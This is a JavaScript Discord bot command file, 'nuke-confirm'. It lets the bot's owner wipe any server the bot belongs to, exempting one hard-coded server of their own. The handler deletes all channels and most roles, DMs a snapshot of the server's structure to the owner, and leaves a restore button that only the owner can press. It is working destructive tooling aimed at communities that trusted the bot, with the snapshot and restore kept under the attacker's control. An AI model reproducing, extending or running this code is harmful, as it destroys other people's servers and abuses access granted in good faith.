import { ChannelType, EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder } from 'discord.js';
import { saveServerSnapshot, storeNukeSnapshot } from '../../utils/nukeSnapshots.js';
import { botConfig } from '../../config/botConfig.js';
import { logger } from '../../utils/logger.js';

export default {
    name: 'nuke-confirm',
    async execute(interaction, client, args) {
        if (!botConfig.commands.owners.includes(interaction.user.id)) {
            return interaction.reply({ content: '❌ Only the bot owner can confirm this.', ephemeral: true });
        }

        const guildId = args[0];
        if (guildId === '1412267331266281593') return interaction.reply({ content: '🛡️ This server is protected and cannot be nuked.', ephemeral: true });
        const guild = client.guilds.cache.get(guildId);
        if (!guild) return interaction.reply({ content: '❌ Could not find the server.', ephemeral: true });

        await interaction.update({ components: [] });

        // Save snapshot + DM to owner
        const snapshot = await saveServerSnapshot(guild);
        storeNukeSnapshot(guild.id, snapshot);
        try {
            const json = JSON.stringify(snapshot, null, 2);
            await interaction.user.send({
                content: `💾 **Snapshot saved before nuke of \`${guild.name}\`**`,
                files: [{ attachment: Buffer.from(json), name: `${guild.name.replace(/[^a-z0-9]/gi, '_')}-snapshot.json` }],
            });
        } catch (e) { logger.warn('Could not DM snapshot before nuke:', e.message); }

        let rolesDeleted = 0, channelsDeleted = 0, errors = [];

        const roles = [...guild.roles.cache.values()]
            .filter(r => !r.managed && r.id !== guild.id)
            .sort((a, b) => a.position - b.position);
        for (const r of roles) {
            if (r.position >= guild.members.me.roles.highest.position) continue;
            await r.delete('Server nuke').catch(() => {});
            rolesDeleted++;
        }

        for (const [, ch] of guild.channels.cache) {
            await ch.delete('Server nuke').catch(() => {});
            channelsDeleted++;
        }

        // Create #recovery channel
        let recoveryChannel = null;
        try {
            recoveryChannel = await guild.channels.create({
                name: 'recovery',
                type: ChannelType.GuildText,
                reason: 'Nuke recovery channel',
            });
            const restoreBtn = new ButtonBuilder()
                .setCustomId(`nuke-restore:${guild.id}`)
                .setLabel('🔄 Restore Server')
                .setStyle(ButtonStyle.Success);
            await recoveryChannel.send({
                embeds: [new EmbedBuilder()
                    .setColor(0xED4245)
                    .setTitle('💣 Server Nuked')
                    .setDescription(`All channels and roles have been deleted.\n\n🎭 **${rolesDeleted}** roles deleted · 📁 **${channelsDeleted}** channels deleted\n\nClick **Restore Server** to recreate everything from the snapshot.`)
                    .setFooter({ text: 'Only the bot owner can restore.' })
                    .setTimestamp()
                ],
                components: [new ActionRowBuilder().addComponents(restoreBtn)],
            });
        } catch (e) { errors.push(`Recovery channel: ${e.message}`); }

        const summary = `💣 **Nuke complete** on **${guild.name}**\n\n🎭 Deleted: **${rolesDeleted}** roles · 📁 Deleted: **${channelsDeleted}** channels${errors.length ? `\n\n⚠️ Errors:\n${errors.join('\n')}` : ''}`;
        await interaction.user.send({ embeds: [new EmbedBuilder().setColor(0xED4245).setDescription(summary).setTimestamp()] }).catch(() => {});
    },
};
